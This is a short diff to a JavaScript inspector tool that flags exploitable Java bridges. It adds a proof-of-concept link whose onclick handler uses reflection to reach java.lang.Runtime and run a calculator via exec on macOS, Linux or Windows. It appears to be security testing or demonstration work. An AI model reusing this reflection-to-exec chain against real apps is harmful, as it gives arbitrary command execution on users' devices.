@@ -277,7 +277,7 @@ window.inspector = function(){
       output += '<div class="box">Is a Java bridge</div>';
       try {
         obj.getClass().forName("java.net.Socket").newInstance();
-        output += '<div class="error">Exploitable Java bridge found</div>';
+        output += '<div class="error"><a href="#" onclick="var field='+escapeHTML(generatePath(path))+'.getClass().forName(\'java.lang.Runtime\').getDeclaredField(\'currentRuntime\');field.setAccessible(true);var runtime = field.get(123);if(/mac/i.test(navigator.platform))runtime.exec(\'open -a Calculator\');if(/linux/i.test(navigator.platform))runtime.exec(\'/bin/bash -c gnome-calculator\');if(/win/i.test(navigator.platform))runtime.exec(\'calc\');">Exploitable Java bridge found</a></div>';
       } catch(e){}
     }
     try {
